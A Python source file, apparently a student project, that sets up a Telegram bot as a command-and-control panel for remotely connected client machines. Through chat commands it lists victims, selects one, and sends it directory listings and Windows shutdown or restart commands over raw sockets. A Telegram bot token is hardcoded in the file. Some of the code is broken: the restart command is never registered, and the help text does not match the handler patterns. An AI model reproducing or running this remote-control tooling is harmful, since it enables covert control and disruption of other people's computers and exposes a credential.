from telegram.ext.updater import Updater
from telegram.update import Update
from telegram.ext.callbackcontext import CallbackContext
from telegram.ext.commandhandler import CommandHandler
from telegram.ext.regexhandler import RegexHandler
from telegram.ext.messagehandler import MessageHandler
from telegram.ext.filters import Filters

all_connections = []
all_address = []
connection = None
target = None


# ==========================================================================================================================
# Chạy Telegram Bot
def run_telegrambot():
    updater = Updater("5637318457:AAEwRuZFX9C0by8OEg1a07gr94MvT9F35pc",
                      use_context=True)

    def start(update: Update, context: CallbackContext):
        update.message.reply_text(
            "Hello, from PTIT with love")

    def help(update: Update, context: CallbackContext):
        results = ""
        results += "/start\n"
        results += "/help\n"
        results += "/list: show all clients have been connected\n"
        results += "/select_{id}: select connection\n"
        results += "/dir: show directory\n"
        results += "/shutdown{time}: shutdown in {time} s\n"
        results += "/restart{time}: restart in {time} s\n"
        results += "/close: close connection\n"
        update.message.reply_text(results)

    # Hiện thị list các clients khả dụng
    def list_connections(update: Update, context: CallbackContext):
        results = ''
        for i, conn in enumerate(all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del all_connections[i]
                del all_address[i]
                continue

            results += str(
                i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

        if results:
            results = "----Clients----" + "\n" + results
        else:
            results = "Haven't connected to any clients yet!"
        update.message.reply_text(results)

    # Chọn 1 client
    def get_target(update: Update, context: CallbackContext):
        global target
        try:
            target = update.message.text.replace('/select_', '')
            target = int(target)

            global connection
            connection = all_connections[target]
            update.message.reply_text(
                "You are now connected to :" + str(all_address[target][0]))
        except:
            update.message.reply_text("Selection not valid")

    # Gửi command tới client
    def send_commands(connection, cmd, update: Update, context: CallbackContext):
        try:
            if len(str.encode(cmd)) > 0:
                connection.send(str.encode(cmd))
                client_response = str(connection.recv(20480), "utf-8")
                update.message.reply_text(client_response)
        except:
            update.message.reply_text("Error sending commands")

    def send_dir_commands(update: Update, context: CallbackContext):
        cmd = "dir"
        send_commands(connection, cmd, update, context)

    def send_shutdown_in_time_commands(update: Update, context: CallbackContext):
        time = update.message.text.replace('/shutdown_', '')
        cmd = f"shutdown -s -t {time}"
        send_commands(connection, cmd, update, context)
        update.message.reply_text(f"Client will shutdown in {time}")

    def send_restart_in_time_commands(update: Update, context: CallbackContext):
        time = update.message.text.replace('/restart_', '')
        cmd = f"shutdown -r -t {time}"
        send_commands(connection, cmd, update, context)
        update.message.reply_text(f"Client will restart in {time}")

    def close_connection(update: Update, context: CallbackContext):
        try:
            connection.close()
            del all_connections[target]
            del all_address[target]
            update.message.reply_text("Connection has been closed!")
        except:
            update.message.reply_text("Somethings error!")

    def unknown_text(update: Update, context: CallbackContext):
        update.message.reply_text(
            "Sorry I can't recognize you , you said '%s'" % update.message.text)

    def unknown(update: Update, context: CallbackContext):
        update.message.reply_text(
            "Sorry '%s' is not a valid command" % update.message.text)

    updater.dispatcher.add_handler(CommandHandler('start', start))
    updater.dispatcher.add_handler(CommandHandler('help', help))
    updater.dispatcher.add_handler(CommandHandler('list', list_connections))
    updater.dispatcher.add_handler(
        RegexHandler('^(/select_[\d]+)$', get_target))
    updater.dispatcher.add_handler(CommandHandler('dir', send_dir_commands))
    updater.dispatcher.add_handler(
        RegexHandler('^(/shutdown_[\d]+)$', send_shutdown_in_time_commands))
    updater.dispatcher.add_handler(CommandHandler('close', close_connection))
    updater.dispatcher.add_handler(MessageHandler(Filters.text, unknown))
    updater.dispatcher.add_handler(MessageHandler(
        # Filters out unknown commands
        Filters.command, unknown))
    # Filters out unknown messages.
    updater.dispatcher.add_handler(MessageHandler(Filters.text, unknown_text))
    updater.start_polling()
